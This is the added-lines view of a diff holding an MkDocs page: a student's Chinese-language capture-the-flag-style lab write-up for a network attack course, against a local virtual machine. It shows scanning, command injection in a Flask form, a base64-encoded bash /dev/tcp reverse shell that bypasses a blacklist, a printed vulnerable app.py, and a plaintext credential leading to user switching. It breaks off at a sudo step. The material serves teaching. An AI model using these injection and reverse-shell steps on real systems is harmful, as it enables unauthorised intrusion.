+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1019/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1019
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1020/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1020
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1021/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1021
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1022/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1022
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1023/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1023
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1024/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1024
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/OnlineJudges-Solutions/P1025/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P1025
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_3_3" id="__nav_2_1_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Theory
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_1_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Theory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/A001_%E8%AE%B0%E5%8F%B7/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    A001 记号
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L001_%E5%9B%BE%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L001 图的基本概念
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L002_%E8%BF%9E%E9%80%9A%E5%92%8C%E9%81%8D%E5%8E%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L002 连通和遍历
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L003_%E5%9C%88%E5%92%8C%E9%81%8D%E5%8E%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L003 圈和遍历
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L004_%E8%BF%9E%E9%80%9A%E5%BA%A6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L004 连通度
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L005_%E5%8C%B9%E9%85%8D/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L005 匹配
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L006_%E5%8D%95%E6%BA%90%E6%9C%80%E7%9F%AD%E8%B7%AF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L006 单源最短路
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L007_%E5%A4%9A%E6%BA%90%E6%9C%80%E7%9F%AD%E8%B7%AF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L007 多源最短路
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L008_%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91%E5%92%8C%E8%B5%8B%E6%9D%83%E6%AC%A7%E6%8B%89%E5%9B%BE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L008 最小生成树和赋权欧拉图
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L009_%E6%9C%89%E5%90%91%E5%9B%BE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L009 有向图
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L010_%E6%B5%81%E7%BD%91%E7%BB%9C%E5%92%8C%E6%9C%80%E5%A4%A7%E6%B5%81/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L010 流网络和最大流
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L011_%E7%8B%AC%E7%AB%8B%E3%80%81%E8%A6%86%E7%9B%96%E5%92%8C%E6%94%AF%E9%85%8D/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L011 独立、覆盖和支配
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L012_%E6%9F%93%E8%89%B2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L012 染色
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L013_%E5%B9%B3%E9%9D%A2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L013 平面
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L014_%E7%BE%A4%E5%92%8C%E5%BE%AA%E7%8E%AF%E7%BE%A4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L014 群和循环群
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L015_%E7%BD%AE%E6%8D%A2%E7%BE%A4%E3%80%81%E9%99%AA%E9%9B%86%E5%92%8C%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E5%AE%9A%E7%90%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L015 置换群、陪集和拉格朗日定理
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L016_%E4%BB%A3%E6%95%B0%E7%BC%96%E7%A0%81/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L016 代数编码
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../problem_solving_III/Theory/L017_%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E4%B8%AD%E7%9A%84%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L017 抽象代数中的其他问题
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Out class learning
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Out class learning
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Freely learning
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Freely learning
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_1" id="__nav_3_1_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSAPP
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CSAPP
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../out_class_learning/freely_learning/CSAPP/CSAPPreadme/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSAPPreadme
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../out_class_learning/freely_learning/CSAPP/L05-Machine-Level-Programming-I-Basics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L05 Machine-Level Programming I: Basics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../out_class_learning/freely_learning/CSAPP/L06-Machine-Level-Programming-II-Control/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L06 Machine-Level Programming II: Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../out_class_learning/freely_learning/CSAPP/L07-Machine-Level-Programming-III-Procedures/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L07 Machine-Level Programming III: Procedures
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../out_class_learning/freely_learning/CSAPP/L08-Machine-Level-Programming-IV-Data%20-%20%E5%89%AF%E6%9C%AC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L08 Machine-Level Programming IV: Data
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../out_class_learning/freely_learning/CSAPP/L09-Machine-Level-Programming-V-Advanced-Topics%20-%20%E5%89%AF%E6%9C%AC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L09 Machine-Level Programming V: Advanced Topics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../out_class_learning/freely_learning/CSAPP/L10-Program-Optimization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L10 Program Optimization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../out_class_learning/freely_learning/CSAPP/L11-The-Memory-Hierarchy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L11 The Memory Hierarchy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../out_class_learning/freely_learning/CSAPP/L12-Cache-Memories/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    L12 Cache Memories
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Quickly learning
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Quickly learning
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../out_class_learning/quickly_learning/C%2B%2BOOP%20%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C++OOP 快速入门
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../out_class_learning/quickly_learning/MkDocs%20%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MkDocs 快速入门
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../out_class_learning/quickly_learning/%E4%B8%89%E5%B0%8F%E6%97%B6%E5%89%8D%E7%AB%AF%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    三小时前端快速入门
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        附加题
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="附加题">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1337-telnet" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        一、1337 端口用 telnet 访问服务存在漏洞，试寻找之
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        二、三个数字的用处
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        三、对第一个问题的另一个回答
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>Lab8</h1>
+
+<p>Network Atk&amp;Def lab7 241840273 杨良灼</p>
+<p>查询攻击机 ip</p>
+<pre><code class="language-bash">└─$ ifconfig
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.0.2.4  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::9d17:dec1:4341:a804  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 08:00:27:3c:97:80  txqueuelen 1000  (Ethernet)
+        RX packets 1  bytes 590 (590.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 25  bytes 3214 (3.1 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 8  bytes 480 (480.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 8  bytes 480 (480.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</code></pre>
+<p>主机发现</p>
+<pre><code class="language-bash">└─$ sudo arp-scan -l
+Interface: eth0, type: EN10MB, MAC: 08:00:27:3c:97:80, IPv4: 10.0.2.4
+WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
+WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+10.0.2.1        52:54:00:12:35:00       (Unknown: locally administered)
+10.0.2.2        52:54:00:12:35:00       (Unknown: locally administered)
+10.0.2.3        08:00:27:3d:19:c5       (Unknown)
+10.0.2.10       08:00:27:12:0c:64       (Unknown)
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.919 seconds (133.40 hosts/sec). 4 responded
+</code></pre>
+<p>端口扫描</p>
+<pre><code class="language-bash">└─$ sudo nmap -p- 10.0.2.10
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 00:07 EST
+Nmap scan report for 10.0.2.10
+Host is up (0.00013s latency).                                                                                                                             
+Not shown: 65531 closed tcp ports (reset)                                                                                                                  
+PORT     STATE    SERVICE                                                                                                                                  
+21/tcp   open     ftp
+22/tcp   filtered ssh
+1337/tcp open     waste
+7331/tcp open     swx
+MAC Address: 08:00:27:12:0C:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.50 seconds
+</code></pre>
+<p>尝试用浏览器访问各端口，只有 7331 端口有个界面</p>
+<p><img alt="8-1" src="../8-1.png" /></p>
+<p>使用 dirsearch 或 dirb 扫描什么都没扫出来，我们使用一个更大的字典去扫描：</p>
+<pre><code class="language-bash">└─$ cd /usr/share/wordlists
+└─$ ls
+└─$ sudo apt install seclists
+</code></pre>
+<p>我们安装 seclists，并使用其中的字典去扫描：</p>
+<pre><code class="language-bash">└─$ dirsearch -u http://10.0.2.10:7331 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           
+ (_||| _) (/_(_|| (_| )                                                                                                                                    
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220545
+
+Output File: /home/kali/reports/http_10.0.2.10_7331/_25-11-30_00-37-41.txt
+
+Target: http://10.0.2.10:7331/
+
+[00:37:41] Starting:                                                                                                                                       
+[00:38:29] 200 -  385B  - /wish                                             
+[00:39:45] 200 -    2KB - /genie                                            
+
+Task Completed    
+</code></pre>
+<p>搜到了两个目录，浏览器尝试打开 <code>http://10.0.2.10:7331/wish</code> 和 <code>http://10.0.2.10:7331/genie</code>.</p>
+<p><img alt="8-2" src="../8-2.png" /></p>
+<p><img alt="8-3" src="../8-3.png" /></p>
+<p>根据 wish 页面的提示，我们输入随便什么指令，发现都会跳转到 genie 页面，但是导航栏给出的信息不同：</p>
+<pre><code class="language-bash">&gt; whoami
+&lt; http://10.0.2.10:7331/genie?name=www-data%0A
+&gt; pwd
+&lt; http://10.0.2.10:7331/genie?name=%2Fopt%2F80%0A
+&gt; id
+&lt; http://10.0.2.10:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A
+&gt; whereis bash
+&lt; http://10.0.2.10:7331/genie?name=bash%3A+%2Fbin%2Fbash+%2Fetc%2Fbash.bashrc+%2Fusr%2Fshare%2Fman%2Fman1%2Fbash.1.gz%0A
+&gt; cat /etc/passwd
+&lt; http://10.0.2.10:7331/genie?name=Wrong+choice+of+words
+</code></pre>
+<p>我们还可以输入一些其他命令，我们发现大多命令都会返回一些东西，但是有些命令则返回 Wrong choice of words. 如果我们直接尝试使用反弹 shell，也会返回这个，这表明命令很可能存在黑名单过滤机制，并且阻止我们利用反弹 shell 套取权限。</p>
+<p>我们采用可逆的 base64 加密绕过明文过滤，之后再解码执行：先监听比如 3343 端口：</p>
+<pre><code class="language-bash">└─$ nc -nlvp 3343
+listening on [any] 3343 ...
+</code></pre>
+<p>将反弹 shell 命令加密（这个可以使用 burp suite 的 decoder 界面完成）：</p>
+<pre><code class="language-bash">&gt; bash -i &gt;&amp; /dev/tcp/10.0.2.4/3343 0&gt;&amp;1
+&lt; YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuNC8zMzQzIDA+JjE=
+</code></pre>
+<p>利用管道符搞出这个指令：</p>
+<pre><code class="language-bash">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuNC8zMzQzIDA+JjE= | base64 -d | bash
+</code></pre>
+<p>反弹 shell 成功：</p>
+<p><img alt="8-4" src="../8-4.png" /></p>
+<p>看下有什么：</p>
+<pre><code class="language-bash">www-data@box7:/opt/80$ ls -l      
+ls -l
+total 16
+-rw-r--r-- 1 www-data www-data 1323 Nov 13  2019 app.py
+-rw-r--r-- 1 www-data www-data 1846 Nov 14  2019 app.pyc
+drwxr-xr-x 5 www-data www-data 4096 Nov 13  2019 static
+drwxr-xr-x 2 www-data www-data 4096 Nov 14  2019 templates
+</code></pre>
+<p>然后我们 <code>cat app.py</code> 看一看</p>
+<pre><code class="language-python">import subprocess
+
+from flask import Flask, redirect, render_template, request, url_for
+
+app = Flask(__name__)
+app.secret_key = &quot;key&quot;
+
+CREDS = &quot;/home/nitish/.dev/creds.txt&quot;
+
+RCE = [&quot;/&quot;, &quot;.&quot;, &quot;?&quot;, &quot;*&quot;, &quot;^&quot;, &quot;$&quot;, &quot;eval&quot;, &quot;;&quot;]
+
+
+def validate(cmd):
+    if CREDS in cmd and &quot;cat&quot; not in cmd:
+        return True
+
+    try:
+        for i in RCE:
+            for j in cmd:
+                if i == j:
+                    return False
+        return True
+    except Exception:
+        return False
+
+
+@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])
+def index():
+    return render_template(&quot;main.html&quot;)
+
+
+@app.route(&quot;/wish&quot;, methods=['POST', &quot;GET&quot;])
+def wish():
+    execute = request.form.get(&quot;cmd&quot;)
+    if execute:
+        if validate(execute):
+            output = subprocess.Popen(execute, shell=True,
+                                      stdout=subprocess.PIPE).stdout.read()
+        else:
+            output = &quot;Wrong choice of words&quot;
+
+        return redirect(url_for(&quot;genie&quot;, name=output))
+    else:
+        return render_template('wish.html')
+
+
+@app.route('/genie', methods=['GET', 'POST'])
+def genie():
+    if 'name' in request.args:
+        page = request.args.get('name')
+    else:
+        page = &quot;It's not that hard&quot;
+
+    return render_template('genie.html', file=page)
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host='0.0.0.0', debug=True)
+</code></pre>
+<p>我们看到这段代码中有 <code>CREDS</code> 信息，是个目录，有个 <code>RCE</code> 列表和 <code>validate()</code> 函数，还有个 <code>wish()</code> 函数，其中有 <code>Wrong choice of words</code>，表明这就是 wish 页面的后端代码。</p>
+<p>我们看看 <code>CREDS</code> 目录中的内容：</p>
+<pre><code class="language-bash">www-data@box7:/opt/80$ cat /home/nitish/.dev/creds.txt
+cat /home/nitish/.dev/creds.txt
+nitish:p4ssw0rdStr3r0n9
+</code></pre>
+<p>得到了 nitish 的密码，尝试切换，但它告诉我们：</p>
+<pre><code>www-data@box7:/opt/80$ su nitish
+su nitish
+su: must be run from a terminal
+</code></pre>
+<p>所以我们需要更好的 shell 体验：即执行 <code>python -c 'import pty;pty.spawn("/bin/bash")'</code></p>
+<pre><code class="language-bash">└─$ nc -nvlp 3343
+listening on [any] 3343 ...
+connect to [10.0.2.4] from (UNKNOWN) [10.0.2.10] 44830
+bash: cannot set terminal process group (664): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@box7:/opt/80$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+www-data@box7:/opt/80$ su nitish
+su nitish
+Password: p4ssw0rdStr3r0n9
+
+nitish@box7:/opt/80$ 
+</code></pre>
+<p>现在我们就成功切换到 nitish 用户了，接下来看看权限：</p>
+<pre><code class="language-bash">nitish@box7:/opt/80$ sudo -l
+sudo -l
+Matching Defaults entries for nitish on box7:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nitish may run the following commands on box7:
+    (sam) NOPASSWD: /usr/bin/genie
+</code></pre>
+<p>发现可以无条件以 sam 用户执行 <code>/usr/bin/genie</code>：</p>
